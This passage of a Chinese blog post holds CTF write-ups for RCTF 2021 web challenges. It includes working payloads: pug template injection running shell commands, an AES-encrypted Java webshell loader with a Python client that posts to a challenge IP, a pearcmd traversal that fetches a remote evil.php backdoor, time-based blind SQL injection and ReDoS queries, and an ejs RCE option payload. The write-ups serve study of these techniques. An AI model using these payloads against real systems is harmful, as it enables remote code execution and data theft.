            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>error<span class="token punctuation">:</span> <span class="token string">'Fail to load template!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">let</span> tpl <span class="token operator">=</span> result
                <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'USERNAME'</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'CANDYNAME'</span><span class="token punctuation">,</span> candyname<span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'ADDRESS'</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>pug<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>tpl<span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">{</span>filename<span class="token punctuation">:</span> tpl_path<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>直接进行模板内容的替换再渲染&#x3D;&#x3D;&#x3D;模板可控<br>找一找pug的模板注入怎么打翻到了如下payload</p>
<blockquote>
<p>但在pug中不能直接使用require，而是采用global.process的形式<br>❗️根据pug的语法，<code>-</code>后面表示变量或者表达式</p>
</blockquote>
<p>闭合一下后面的括号，再把垃圾注释掉就行<br>这里遇到一个小坑，就是pug这个模板语法对缩进的要求有点严格，之前打半天打不通，本地搭了环境之后报错似乎是说我缩进不对，然后又是换行又是加缩进的，总算是把命令执行掉了</p>
<pre><code>11&#39;)%0d%0a    -var%20x=eval(&quot;global.process.mainModule.require(&#39;child_process&#39;)[&#39;execSync&#39;](&#39;whoami&#39;).toString()&quot;)%0d%0a    -return%20x%0d%0a    //-
</code></pre>
<p>又：pug模板能include外部文本，但是在不指定后缀的情况下会默认添加pug后缀，所以这里不能直接include，但是有一个题flag是flag.txt就能直接include进来</p>
<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>没看懂怎么打，但是我看懂了所有人提交的内容都可以在issue里找到，那必然有人的payload能拿到flag，有些人发了1-100000的全部数字，有的人只发了几个数字，随便翻了翻，翻到几个人在issue里的数字就那么一两个，拿起来一交就成了</p>
<h2 id="ezshell"><a href="#ezshell" class="headerlink" title="ezshell"></a>ezshell</h2><p>虽然是个misc，但感觉还是有点web<br>不过很简单<br>访问上去能直接给个war包，反编译出来就是个shell<br>题目描述说了半天冰蝎，但事实上冰蝎并连不上去，因为冰蝎的马应该是有密钥协商过程的，他这里直接硬编码了密钥。其实就是一个写好了的shell让你自己写个代码连上去。然后题目还说所有出站流量关了，估计就是不能弹shell出来之类的，只能通过你主动和他交互的应答包获取数据<br>至于强调了半天的冰蝎basicinfo，可能是指你要用冰蝎basicinfo搜集信息的地方获取flag</p>
<p>先看看他的shell怎么写的</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            String k<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"post"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                k <span class="token operator">=</span> <span class="token string">"e45e329feb5d925b"</span><span class="token punctuation">;</span>
                HttpSession session <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                session<span class="token punctuation">.</span><span class="token function">putValue</span><span class="token punctuation">(</span><span class="token string">"u"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
                Cipher c <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evilClassBytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BASE64Decoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeBuffer</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token keyword">class</span> <span class="token class-name">U</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">{</span>
                    <span class="token function">U</span><span class="token punctuation">(</span>ClassLoader c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">super</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">public</span> Class <span class="token class-name">g</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>

                Class <span class="token class-name">evilClass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">U</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">g</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>evilClassBytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                Object a <span class="token operator">=</span> evilClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                Method b <span class="token operator">=</span> evilClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"e"</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                b<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>没用的代码
<span class="token punctuation">}</span>
</code></pre>
<p>感觉像是仿冰蝎写了个用aes加密的恶意类加载器。。。</p>
<p>然后翻一个冰蝎出来，反编译一下，在net.rebeyond.behinder.payload.java下找到basicinfo模块，看看都获取了些啥</p>
<pre class=" language-java"><code class="language-java">Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> env <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Properties props <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>好像也没啥，还有些当前目录，OSinfo啥的，这里肯定没什么用<br>那就自己手写个垃圾class呗，按照他那个类的内容写，把冰蝎和他的代码缝合一下，产生如下的缝合怪</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Iterator<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Set<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">e</span><span class="token punctuation">(</span>Object a<span class="token punctuation">,</span>Object b<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
        HttpServletRequest request <span class="token operator">=</span> <span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span> a<span class="token punctuation">;</span>
        HttpServletResponse response <span class="token operator">=</span> <span class="token punctuation">(</span>HttpServletResponse<span class="token punctuation">)</span> b<span class="token punctuation">;</span>
        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> env <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Iterator var5 <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        StringBuilder basicInfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"&lt;br/>&lt;font size=2 color=red>环境变量:&lt;/font>&lt;br/>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">while</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            String name <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var5<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            basicInfo<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>env<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        Properties props <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Set<span class="token operator">&lt;</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Object<span class="token operator">>></span> entrySet <span class="token operator">=</span> props<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Iterator var7 <span class="token operator">=</span> entrySet<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">while</span><span class="token punctuation">(</span>var7<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Object<span class="token operator">></span> entry <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token punctuation">)</span>var7<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            basicInfo<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" = "</span> <span class="token operator">+</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>basicInfo<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>然后凭借我垃圾的java水平，虽然能缝合一个加密和文件读取，但是java的文件读取和http请求也太折磨了，不太会用，交给python解决<br>他的加密没写类型，就当最简单的ECB用，init那的mode写的是个数字2，有点抽象，但是看其他代码那填的是加密还是解密，应该不是加密方式。就按这个写<br>网上搜个python AES的加密代码，魔改一下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">import</span> base64


url <span class="token operator">=</span> <span class="token string">"http://124.70.137.88:60080/shell"</span>
key <span class="token operator">=</span> b<span class="token string">"e45e329feb5d925b"</span>
f <span class="token operator">=</span> open<span class="token punctuation">(</span>r<span class="token string">"D:\Java\projects\untitled1\target\classes\Test.class"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
class_byte <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

bs <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size
pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> bytes<span class="token punctuation">(</span><span class="token punctuation">(</span>bs <span class="token operator">-</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> bs<span class="token punctuation">)</span> <span class="token operator">*</span> chr<span class="token punctuation">(</span>bs <span class="token operator">-</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> bs<span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>
encrypt_class <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>class_byte<span class="token punctuation">)</span><span class="token punctuation">)</span>
base64_class <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypt_class<span class="token punctuation">)</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>base64_class<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p>拿到flag</p>
<h2 id="VerySafe"><a href="#VerySafe" class="headerlink" title="VerySafe"></a>VerySafe</h2><p>不会。这个题代码都没有，就一个caddy反代一个内网的PHP fpm，内网fpm就一个index.php，且无内容<br>caddy感觉是个类似于nginx的服务器，然后这里写了个规则把所有PHP后缀的访问反代到内网PHP fpm上。那第一反应肯定是打fpm啊。搞不好有什么crlf之类的洞呢，然后又开本地环境调试。发现不同字段之间似乎有奇怪的不可打印字符分割，暂时没找到有什么规律可言。而http header等各项属性均不允许存在不可打印字符，似乎CRLF打不通。搜索历史漏洞，无果，不会</p>
<p>赛后请教rmb神仙，他和我说是用目录穿越，用PHP自带的一个叫PEAR的依赖，里面有一个pearcmd.php，可以进行任意文件下载</p>
<p>caddy和nginx有点像，代理服务器和fpm通信时均会发送一个SCRIPT_FILENAME来指定fpm执行哪个文件，并且这个路径是绝对路径，但是nginx会对路径做处理，如果uri开头就是<code>../</code>，则直接返回400，如果是<code>aa/../index.php</code>这种的，也会把跳目录的所有内容先解析掉再发送到后端，所以nginx就不存在这种目录穿越<br>而这里caddy的配置是这个样子的</p>
<pre class=" language-caddy"><code class="language-caddy">:80 {
        root * /srv
        php_fastcgi php:9000
}
</code></pre>
<p>但是他和后端通信的时候，直接是把请求的uri拼在这个root上作为SCRIPT_FILENAME发过去的，就导致能目录穿越到别的地方，去执行其他的脚本</p>
<p>pearcmd具体没仔细看，是个包管理器，能下载安装包，还能指定路径，并且下载的文件格式不对他也不管，反正就是下下来了。。。</p>
<p>但是这个文件理论上应该是在命令行上运行的，接受的参数是<code>$argc $argv</code>这种的，但是PHP有一个配置名为register_argc_argv，默认为On，但php.ini中默认为Off，在未指定php.ini时会启动(据说docker大多都未指定php.ini)，且该属性可以通过.user.ini来进行修改<br>这个属性开启后，PHP会注册<code>$argc,$argv</code>这两个变量，并且可以从<code>$_SERVER[&#39;argv&#39;]</code>中获取到该值，并且该值可以通过GET请求提交，但这里变量的分隔符变为了<code>+</code>，而不是常见的<code>&amp;</code></p>
<p>能任意文件下载的话就下一个后面再目录穿越包含就行了<br><code>/../usr/local/lib/php/pearcmd.php?+install+-R+/tmp+http://ip/evil.php</code><br>evil.php要把后门内容echo出来哦。。。。</p>
<p>多了一个在PHP功能点只有一个include的情况下，除开upload_progress又一个攻击的手段</p>
<h2 id="看官方wp环节"><a href="#看官方wp环节" class="headerlink" title="看官方wp环节"></a>看官方wp环节</h2><p><a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">RCTF 2021 Official Writeup</a><br>说到底官方wp看起来详细实际上还是有点抽象啊。。。不自己找点东西根本不能理解</p>
<p>提一嘴，官方wp里在EasyPHP下提到$uri不会urldecode，是fpm进行的decode，我觉得不对，我之前直接改端口抓的流量显示是nginx自己将$uri这个变量解码了，如果使用的变量是$request_uri是不会解码的</p>
<h3 id="EasySQLi"><a href="#EasySQLi" class="headerlink" title="EasySQLi"></a>EasySQLi</h3><p>出题人强行引流，wp还引，我直接卧槽嘉畜</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'db.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$order</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT CONCAT('RCTF{',USER(),'}') AS FLAG WHERE '🍬关注嘉然🍬' = '🍬顿顿解馋🍬' OR '🍬Watch Diana a day🍬' = '🍬Keep hunger away🍬' OR '🍬嘉然に注目して🍬' = '🍬食欲をそそる🍬' ORDER BY $order;"</span><span class="token punctuation">;</span>

<span class="token variable">$stm</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"Count {$stm->rowCount()}."</span><span class="token punctuation">;</span>

<span class="token function">usleep</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1e6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>一开始我连代码逻辑都看不懂，因为这里又设置了set_time_limit(1);又在最后进行了一个usleep，而usleep的时间稳定大于1s，也就是百分百会延时1s退出<br>但题目提示又是时间盲注，给人整懵了</p>
<p>后来是看了gml神仙的wp，在set_time_limit中有这样的限制</p>
<blockquote>
<p>Note:<br>The set_time_limit() function and the configuration directive max_execution_time only affect the execution time of the script itself. Any time spent on activity that happens outside the execution of the script such as system calls using system(), stream operations, database queries, etc. is not included when determining the maximum time that the script has been running. This is not true on Windows where the measured time is real.</p>
</blockquote>
<p>也就是说SQL本身的延时并不在这个计时范围内，但是由于他本身有1s的延时，所以SQL注入的延时也得再来个1s左右以进行判断。<br>并且这里where语句的条件恒为假，选不出来数据，就没法order by，本地测试的时候如果数据只有一条，也不会对其进行order by<br>gml神仙提到pdo默认配置是允许堆叠注入的，不过这里关了，所以还需要找办法</p>
<p>理论上这个语句已经无敌防御了，因为无论如何order by后面的语句都不会被执行，但这里有一点非常奇怪。首先我们知道order by处是无法进行预处理的，其次是出题人的预处理语法也写的和没写一样，因为他先把参数拼完再进行预处理，而不是像正常使用一样先放个占位符（当然这是看完wp后进行反推的结果嘻嘻）</p>
<p>然后跟着wp进行测试，发现预处理时会对某些操作进行运算，比如提到的updatexml的报错，如果在这里使得updatexml中的操作耗时极长，就可以造成延时的效果<br>为什么不直接sleep？因为我试了一下预处理的时候不会对sleep进行执行，达咩达咩</p>
<p><strong>预期解是超级阅读MySQL源码</strong>，对不起我太弱了</p>
<p>所以这里可以用updatexml配超级repeat来延时，或者套几十层hex，每套一层计算量乘2？</p>
<pre class=" language-mysql"><code class="language-mysql">SELECT
    CONCAT( 'RCTF{', USER (), '}' ) AS FLAG 
WHERE
    '🍬关注嘉然🍬' = '🍬顿顿解馋🍬' OR '🍬Watch Diana a day🍬' = '🍬Keep hunger away🍬' OR '🍬嘉然に注目して🍬' = '🍬食欲をそそる🍬' 
ORDER BY
(
    updatexml (1,
        IF(
            ASCII(SUBSTR((SELECT USER()), 1, 1 )) = 65,
            CONCAT(REPEAT('a', 40000000), REPEAT('a', 40000000), REPEAT('a', 40000000), REPEAT('a', 40000000), REPEAT('b', 10000000)),
            1
        ),
        1
    ) 
)
</code></pre>
<p>还有出题人的ReDos payload</p>
<pre class=" language-mysql"><code class="language-mysql">SELECT
    CONCAT( 'RCTF{', USER (), '}' ) AS FLAG 
WHERE
    '🍬关注嘉然🍬' = '🍬顿顿解馋🍬' OR '🍬Watch Diana a day🍬' = '🍬Keep hunger away🍬' OR '🍬嘉然に注目して🍬' = '🍬食欲をそそる🍬' 
ORDER BY
(
    SELECT 1 WHERE
        IF(
            ASCII(SUBSTR(USER(), 1, 1 )) = 65,
            REPEAT('a', 100),
            'a'
        )
        RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b' 
)
</code></pre>
<p>gml神仙最后提到这些操作如果携带了<code>from table</code>这样的语句就不会延时了（那么表内字段行不行？待考据），但是我本地用这个语句试了一下还是延时的，不过我本地的MySQL是5.5的远古版本了，可能和新版本不一致，也有可能是我这个payload并不是放在if的判断处？</p>
<pre class=" language-mysql"><code class="language-mysql"> prepare a from 'select * from users where 0 order by (updatexml(1,if(1,(select id from users where username=concat(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(111111)))))))))))))))))))))))))))))),1),1))';
</code></pre>
<p>以及也提到MySQL在8.0.22修了updatexml的延时问题，只有在都是常量的时候比较还有可能延时，其余的都不行了</p>
<h3 id="xss-it"><a href="#xss-it" class="headerlink" title="xss it?"></a>xss it?</h3><p>好玄幻哦，我一直以为ejs无敌转义来着，知道ejs有原型链污染下的rce，但是没想到没有原型链污染，就纯前端版本的ejs也能打rce</p>
<p>以及我感觉这个题是个xs-leak，可惜也没做出来<br>官方wp提到三个做法，一个无原型链污染rce，被修了之后可以用Unicode绕过，一个xs-leak打法，以及一个老版本bot的非预期</p>
<h4 id="解1"><a href="#解1" class="headerlink" title="解1"></a>解1</h4><p>最好理解的无原型链污染、options可控下的rce<br>具体分析过程即为wp中给出的参考链接<br><a href="https://www.freebuf.com/articles/web/261607.html">Nodejs中模板引擎渲染原理与潜在隐患探讨</a><br>攻击手段即为利用ejs的允许的部分参数，在渲染的时候插入代码，在<code>compileDebug</code>和<code>filename</code>均存在的情况下，可以将用户可控的代码写入渲染模板中的注释<br>使用换行即可逃逸注释符，写入代码，并可以使用finally字段来使得在try catch返回之前执行插入的代码<br>然而此处的ejs版本为3.1.6，文章中的影响版本截止3.1.5，在3.1.6中对传入的filename进行了<code>JSON.stringify()</code>的操作，输入的<code>\u000d\u000a</code>被转义成<code>\r\n</code>（并且是那种转义到\r\n不代表换行仅为对应字符串的程度），需要进行绕过，通过查阅文档，找到新的分隔符<code>\u2028</code>进行换行绕过</p>
<p>同文章中提到的内容，正常流程下代码无法执行到这一步，可以使用两种方法进行绕过，1是文章中的finally强行在try结束时调用，2是wp中的定义<code>escapeFn</code>函数，js中有提升这一说法，后面定义的函数也能在定义前进行调用</p>
<p>任意代码执行之后直接发出来就行，这里有一个变量<code>__lines</code>应该就是当前被渲染的属性值？<br><code>asoul=&#123;&quot;jiaran&quot;: &quot;1&quot;, &quot;xiangwan&quot;: &quot;2&quot;, &quot;nailin&quot;: &quot;3&quot;, &quot;jiale&quot;: &quot;4&quot;, &quot;beila&quot;:&quot;5&quot;, &quot;compileDebug&quot;: true, &quot;filename&quot;:&quot;aa\u2028finally&#123;alert(__lines)&#125;//&quot;&#125;</code></p>
<h4 id="解2"><a href="#解2" class="headerlink" title="解2"></a>解2</h4><p>这个感觉比较预期，打一个xs-leak，上面这个解可能是什么神仙干出来的<br>预期解为修改分隔符，把原来的<code>%</code>替换为进行猜测的数据，通过渲染成功与否进行判断</p>
<p>输入的模板为<code>&lt;%= jiaran+xiangwan+beila+jiale+nailin %&gt;RCTF&#123;this_is_a_flag_you_should_pay_attension_to_asoul_to_get_it&#125;</code><br>而我们将分隔符由<code>%</code>变为<code>%= jiaran+xiangwan+beila+jiale+nailin %&gt;</code><br>这样子，如果flag匹配上了，原模板会被解析为<code>&lt;自定义分隔符RCTF&#123;this_is_a_flag_you_should_pay_attension_to_asoul_to_get_it&#125;</code><br>而这种情况下，ejs会认为找不到模板标签结束符，从而抛出错误，若自定义分隔符未能与模板匹配，则会认为该模板中没有标签，进行原样输出，正常加载</p>
<p>终端测试如下</p>
